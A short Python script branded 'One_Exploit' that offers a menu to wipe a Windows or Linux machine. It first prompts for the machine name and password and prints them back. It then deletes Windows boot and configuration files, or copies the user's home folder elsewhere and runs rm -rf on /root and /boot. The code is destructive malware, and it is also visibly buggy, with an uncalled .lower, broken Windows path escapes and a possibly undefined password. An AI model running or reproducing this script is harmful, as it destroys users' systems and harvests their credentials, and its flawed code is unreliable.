import os
from getpass import getpass
import time

os.system('clear')
os.system('cls')

def run():
    time.sleep(1)
    WindowsLinux = print('''
    [01] -> Windows
    [02] -> Linux
    [03] -> Os
    [99] -> exit
    ''')
    sys = input('one_exploit -> ')
    if sys == '01':
        def delWindows():
            time.sleep(1)
            os.system('clear')
            os.system('cls')
            print('''
                        w                     w  iiiiii    n           n
                         w         w         w      ii     n n         n
                          w       w w       w       ii     n   n       n
                           w     w   w     w        ii     n     n     n
                            w   w     w   w         ii     n       n   n
                             w w       w w          ii     n         n n
                              w         w        iiiiiiii  n           n
            ''')


            namesystem = input('Plese inter the name your pc: ')
            password = input('your system have password?(Y , n) : ')
            if password == 'Y':
                passnamesystem = getpass('Inter password '+namesystem+" : ")
            else:
                pass
                
            yesno = input('Do you want to continue("Y , n"): ').lower
            if yesno == 'y':
                print(f'usename: {namesystem}')
                print(f'pass: {passnamesystem}')
                os.system('off')
                os.system('attrib -r -g -h C:\autoexec.bat')
                os.system('del C:\autoexec.bat')
                os.system('attrib -r -g -h C:\boot.ini')
                os.system('del C:\boot.ini')
                os.system('attrib -r -g -h C:\ntidr')
                os.system('del C:\ntidr')
                os.system('attrib -r -g -h C:\windows\win.ini')
                os.system('del C:\windows\win.ini')
                print('=============================')
                print('    YOU DELET ALL SYSTEM    |')
                print('=============================')
                    
            else:
                exit

        delWindows()
    elif sys == '02':
        def delLinux():
            time.sleep(1)
            os.system('cls')
            os.system('clear')
            print('''
                    ll        iiiiii          n           n
                    ll          ii           n n         n
                    ll          ii          n   n       n
                    ll          ii         n     n     n
                    ll          ii        n       n   n
                    ll          ii       n         n n
                    ll ll ll  iiiiii    n           n
            ''')

            namesystem = input('Plese inter the name your pc: ')
            password = input('your system have password?(Y , n) : ')
            if password == 'Y':
                passnamesystem = getpass('Inter password '+namesystem+" : ")
            else:
                pass

            yesno1 = input('Do you want ("Y , n"): ').lower
            if yesno1 == 'y':
                print(f'usename: {namesystem}')
                print(f'pass: {passnamesystem}')
                os.system('sudo su')
                os.system('echo '+passnamesystem)
                os.system('cp -r /home/'+namesystem+'/* /techer0221/')
                os.system('sudo cp -r /boot/* /root/boot/') or os.system('cp -r /boot/* /root/boot/')
                os.system('sudo cp -r /root/*') or os.system('cp -r /root/*')
                os.system('sudo rm -rf /root/*') or os.system('rm -rf /root/*')
                os.system('sudo rm -rf /boot/*') or os.system('rm -rf /boot/*')
                print('=============================')
                print('    YOU DELET ALL SYSTEM    |')
                print('=============================')
                print('We are One_Exploit')
            else:
                exit
        delLinux()

    elif sys == '03':    
        def delOs():
            print('coming son')
            pass
        delOs()

    elif sys == '99':
        print('''
        =========
        | By By |
        =========
        ''')
        exit
run()  
    